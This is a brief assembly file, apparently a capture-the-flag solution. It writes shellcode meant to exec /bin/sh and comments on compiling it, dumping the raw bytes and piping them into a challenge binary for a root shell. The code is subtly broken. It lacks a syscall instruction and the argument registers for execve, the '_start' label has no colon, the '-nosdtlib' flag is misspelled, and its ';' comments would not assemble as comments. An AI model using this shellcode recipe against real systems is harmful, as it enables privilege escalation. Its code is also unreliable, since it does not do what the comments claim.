;One way to exploit this challenge is with shellcoding. 
;There are also other ways, but it's always better to know how to write shellcode;)

.global _start
_start
.intel_syntax noprefix
  mov rax, 59
  lea rdi, [binsh]
  
 binsh:
  .string "/bin/sh"
  
  ;save file as shellcode.s and compile like this `gcc -static -nosdtlib -o shellcode-elf shellcode.s`
  ;then dump the raw shellcode `objcopy --dump-section .text=shellcode-raw shellcode-elf
  ;after that it can be redirected into the target challenge with cat
  ;cat shellcode-raw | ./challenge_1
  ;this will execute /bin/sh from the target file and the user will gain root access to the system.
